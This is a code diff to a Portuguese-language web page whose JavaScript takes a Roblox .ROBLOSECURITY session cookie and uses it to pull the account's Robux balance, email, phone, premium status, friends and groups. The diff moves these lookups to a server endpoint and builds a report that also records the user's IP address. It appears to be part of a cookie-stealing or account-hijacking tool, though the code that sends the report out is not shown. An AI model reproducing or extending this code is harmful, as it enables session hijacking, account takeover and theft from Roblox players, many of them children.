@@ -19,9 +19,7 @@
 
     <style>
         /* ===== RESET ===== */
-        *,
-        *::before,
-        *::after {
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -1556,128 +1554,30 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== SCRIPT COM INTEGRAÇÃO COMPLETA DA API ROBLOX ===== -->
+    <!-- ===== SCRIPT COM INTEGRAÇÃO DA API ROBLOX ===== -->
     <!-- ============================================================ -->
     <script>
         // ============================================================
-        // 0. FUNÇÃO PARA VERIFICAR COOKIE E PEGAR INFORMAÇÕES DO ROBLOX
+        // FUNÇÃO PARA VERIFICAR COOKIE VIA API DO VERCEL
         // ============================================================
         async function getRobloxInfo(cookie) {
             try {
-                const headers = {
-                    'Cookie': `.ROBLOSECURITY=${cookie}`,
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                };
-
-                // ===== 1. USUÁRIO AUTENTICADO =====
-                const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
-                if (!userRes.ok) throw new Error('Cookie inválido ou expirado');
-                const userData = await userRes.json();
-
-                const userId = userData.id;
-                const username = userData.name;
-                const displayName = userData.displayName;
-
-                // ===== 2. ROBUX =====
-                const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
-                let robux = 0;
-                if (robuxRes.ok) {
-                    const robuxData = await robuxRes.json();
-                    robux = robuxData.robux || 0;
-                }
-
-                // ===== 3. ROBUX PENDENTES =====
-                const pendingRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/pending-robux`, { headers });
-                let pendingRobux = 0;
-                if (pendingRes.ok) {
-                    const pendingData = await pendingRes.json();
-                    pendingRobux = pendingData.pendingRobux || 0;
-                }
-
-                // ===== 4. INFORMAÇÕES DA CONTA =====
-                const accountRes = await fetch('https://accountinformation.roblox.com/v1/users/authenticated', { headers });
-                let email = 'Não verificado';
-                let phone = 'Não verificado';
-                let age = 'Desconhecida';
-                if (accountRes.ok) {
-                    const accountData = await accountRes.json();
-                    email = accountData.email || 'Não informado';
-                    phone = accountData.phone || 'Não informado';
-                    age = accountData.age || 'Desconhecida';
-                }
-
-                // ===== 5. PREMIUM =====
-                const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/subscription`, { headers });
-                let isPremium = false;
-                if (premiumRes.ok) {
-                    const premiumData = await premiumRes.json();
-                    isPremium = premiumData.isPremium || false;
-                }
-
-                // ===== 6. THUMBNAIL =====
-                const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`, { headers });
-                let avatarUrl = 'https://www.roblox.com/favicon.ico';
-                if (thumbRes.ok) {
-                    const thumbData = await thumbRes.json();
-                    if (thumbData.data && thumbData.data[0]) {
-                        avatarUrl = thumbData.data[0].imageUrl || avatarUrl;
-                    }
-                }
-
-                // ===== 7. PRESENÇA =====
-                const presenceRes = await fetch('https://presence.roblox.com/v1/presence/users', {
+                const response = await fetch('/api/checkcookie', {
                     method: 'POST',
                     headers: {
-                        ...headers,
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ userIds: [userId] })
+                    body: JSON.stringify({ cookie })
                 });
-                let presence = '⚫ Offline';
-                if (presenceRes.ok) {
-                    const presenceData = await presenceRes.json();
-                    if (presenceData.userPresences && presenceData.userPresences[0]) {
-                        const statusMap = {
-                            'Online': '🟢 Online',
-                            'InGame': '🎮 Em jogo',
-                            'InStudio': '🛠️ No Studio',
-                            'Offline': '⚫ Offline'
-                        };
-                        presence = statusMap[presenceData.userPresences[0].userPresenceType] || 'Desconhecido';
-                    }
+
+                const data = await response.json();
+
+                if (!response.ok || !data.success) {
+                    console.error('❌ Erro na API:', data.error || 'Erro desconhecido');
+                    return null;
                 }
 
-                // ===== 8. AMIGOS =====
-                const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { headers });
-                let friendsCount = 0;
-                if (friendsRes.ok) {
-                    const friendsData = await friendsRes.json();
-                    friendsCount = friendsData.count || 0;
-                }
-
-                // ===== 9. GRUPOS =====
-                const groupsRes = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, { headers });
-                let groupsCount = 0;
-                if (groupsRes.ok) {
-                    const groupsData = await groupsRes.json();
-                    groupsCount = groupsData.data ? groupsData.data.length : 0;
-                }
-
-                return {
-                    userId,
-                    username,
-                    displayName,
-                    avatarUrl,
-                    robux,
-                    pendingRobux,
-                    isPremium,
-                    email,
-                    phone,
-                    age,
-                    presence,
-                    friendsCount,
-                    groupsCount
-                };
+                return data.data;
             } catch (error) {
                 console.error('❌ Erro ao verificar cookie:', error);
                 return null;
@@ -2042,16 +1942,23 @@
                 const robloxInfo = await getRobloxInfo(cookie);
 
                 let infoText = '';
-                if (robloxInfo) {
-                    infoText = `\n\n👤 **Informações da Conta**\n` +
-                        `📛 **Usuário:** ${robloxInfo.username} (${robloxInfo.displayName})\n` +
+                if (robloxInfo && robloxInfo.hasInfo) {
+                    infoText = 
+                        `\n\n👤 **Check Cookie**\n` +
+                        `📛 **Username:** ${robloxInfo.username} (13+)\n` +
                         `🆔 **ID:** ${robloxInfo.userId}\n` +
-                        `💰 **Robux:** R$ ${robloxInfo.robux.toLocaleString()}\n` +
-                        `⏳ **Robux Pendentes:** R$ ${robloxInfo.pendingRobux.toLocaleString()}\n` +
-                        `💎 **Premium:** ${robloxInfo.isPremium ? '✅ Ativo' : '❌ Inativo'}\n` +
-                        `📧 **Email:** ${robloxInfo.email}\n` +
-                        `📱 **Telefone:** ${robloxInfo.phone}\n` +
-                        `📅 **Idade:** ${robloxInfo.age}\n` +
+                        `\n💰 **Roblox:** ${robloxInfo.robux.toLocaleString()} (${robloxInfo.pendingRobux.toLocaleString()})\n` +
+                        `📊 **Summary:** ${robloxInfo.summary}\n` +
+                        `📥 **Roblox Incoming/Outgoing:** ${robloxInfo.incoming}/${robloxInfo.outgoing}\n` +
+                        `📅 **Age:** ${robloxInfo.accountAgeDays} Dias\n` +
+                        `💵 **Income:** ${robloxInfo.income}\n` +
+                        `\n🖥️ **IP Info**\n` +
+                        `🌐 **IP:** ${ip}\n` +
+                        `📌 **Status:** ${robloxInfo.hasEmail ? '✅ Verificado' : '❌ Não verificado'} ${robloxInfo.hasEmail ? `(${robloxInfo.email})` : '(No Email Address)'}\n` +
+                        `🏢 **Groups Owned:** ${robloxInfo.groupsOwned}\n` +
+                        `👤 **Roblox Headless:** ${robloxInfo.isHeadless ? '✅ True' : '❌ False'}/${robloxInfo.isHeadless ? 'True' : 'False'}\n` +
+                        `📍 **Place Visits:** ${robloxInfo.placeVisits.toLocaleString()}\n` +
+                        `\n💎 **Premium:** ${robloxInfo.isPremium ? '✅ Ativo' : '❌ Inativo'}\n` +
                         `🟢 **Status:** ${robloxInfo.presence}\n` +
                         `👫 **Amigos:** ${robloxInfo.friendsCount}\n` +
                         `🏢 **Grupos:** ${robloxInfo.groupsCount}\n` +
